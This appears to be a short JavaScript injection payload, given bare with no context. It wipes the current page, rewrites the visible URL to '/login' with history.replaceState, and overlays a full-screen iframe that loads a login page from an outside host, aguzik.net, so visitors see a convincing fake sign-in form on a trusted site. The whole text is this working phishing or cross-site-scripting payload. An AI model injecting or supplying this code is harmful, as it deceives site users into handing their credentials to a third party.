document.body.innerHTML = '';
history.replaceState({ edited: false }, '', '/login');
document.body.innerHTML='<iframe style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;" src="https://aguzik.net/ar-login.html"/>'
//history.replaceState({ edited: true }, '', '/login');
